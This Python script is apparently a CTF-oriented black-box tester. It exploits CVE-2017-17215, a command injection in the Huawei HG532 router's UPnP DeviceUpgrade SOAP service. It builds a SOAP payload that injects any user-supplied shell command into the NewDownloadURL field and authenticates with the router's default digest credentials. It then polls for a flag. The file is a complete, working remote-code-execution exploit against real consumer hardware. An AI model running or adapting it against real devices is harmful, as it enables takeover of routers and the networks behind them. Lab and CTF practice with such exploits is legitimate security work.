import argparse
import socket
import time

import requests
from requests.auth import HTTPDigestAuth

HEADERS = {'Content-Type': 'text/xml; charset="utf-8"'}
DEFAULT_CMD = "echo HG532_CACHE_OK >/tmp/ctf.cache;/bin/check_cache.sh >/tmp/flag_out"

session = requests.Session()
session.trust_env = False


def parse_args():
    parser = argparse.ArgumentParser(description="HG532 CVE-2017-17215 black-box tester")
    parser.add_argument("--host", default="127.0.0.1", help="target host")
    parser.add_argument("--port", type=int, default=37215, help="target port")
    parser.add_argument("--command", help="command injected into NewDownloadURL")
    parser.add_argument("--yes", action="store_true", help="use the default test command without prompting")
    parser.add_argument("--ready-timeout", type=int, default=40, help="seconds to wait for the HTTP endpoint")
    parser.add_argument("--ready-interval", type=int, default=2, help="seconds between readiness probes")
    parser.add_argument("--flag-timeout", type=int, default=8, help="seconds to wait for the flag relay")
    parser.add_argument("--username", default="dslf-config", help="HTTP digest username")
    parser.add_argument("--password", default="admin", help="HTTP digest password")
    return parser.parse_args()


def build_payload(cmd):
    return f'''<?xml version="1.0" ?>
<s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
<s:Body>
<u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">
<NewStatusURL>CH13hh</NewStatusURL>
<NewDownloadURL>;{cmd};</NewDownloadURL>
</u:Upgrade>
</s:Body>
</s:Envelope>'''


def wait_ready(target_url, ready_timeout, ready_interval):
    deadline = time.time() + ready_timeout
    last_error = None

    while time.time() < deadline:
        try:
            r = session.get(target_url, timeout=2)
            print(f"[*] ready: {r.status_code} @ {target_url}")
            return True
        except requests.exceptions.RequestException as e:
            last_error = e
            time.sleep(ready_interval)

    print("[*] endpoint still not ready:", last_error)
    return False


def recv_flag(target_host, target_port, flag_timeout):
    deadline = time.time() + flag_timeout
    last_error = None

    while time.time() < deadline:
        try:
            with socket.create_connection((target_host, target_port), timeout=2) as sock:
                sock.settimeout(2)
                chunks = []

                while True:
                    try:
                        chunk = sock.recv(4096)
                    except socket.timeout:
                        break
                    if not chunk:
                        break
                    chunks.append(chunk)

                data = b"".join(chunks)
                if not data:
                    time.sleep(1)
                    continue

                body_text = data.decode(errors="replace").strip()

                if not body_text or body_text == "File not found." or body_text.startswith("<?xml") or "UpgradeResponse" in body_text:
                    time.sleep(1)
                    continue

                print("\nflag:\n" + body_text)
                return True
        except OSError as e:
            last_error = e
            time.sleep(1)

    print(f"\n[*] flag not ready on {target_host}:{target_port}:", last_error)
    return False


def main():
    args = parse_args()
    target_url = f"http://{args.host}:{args.port}/ctrlt/DeviceUpgrade_1"

    print("-----CVE-2017-17215 HUAWEI HG532 RCE-----\n")
    print(f"[*] target: {args.host}:{args.port}")

    if args.command:
        cmd = args.command
    elif args.yes:
        cmd = DEFAULT_CMD
    else:
        cmd = input(f"command [{DEFAULT_CMD}] > ").strip() or DEFAULT_CMD

    data = build_payload(cmd)

    if not wait_ready(target_url, args.ready_timeout, args.ready_interval):
        raise SystemExit(1)

    try:
        r = session.post(
            target_url,
            timeout=10,
            auth=HTTPDigestAuth(args.username, args.password),
            headers=HEADERS,
            data=data,
        )
        print("\nstatus_code: " + str(r.status_code))
        print("\n" + r.text)
        if r.status_code == 200 and "/bin/check_cache.sh" in cmd:
            if not recv_flag(args.host, args.port, args.flag_timeout):
                raise SystemExit(1)
    except requests.exceptions.RequestException as e:
        print("\nrequest error:", e)
        print("[*] 服务可能不稳定，但会先看目标侧副作用")
        raise SystemExit(1)


if __name__ == "__main__":
    main()
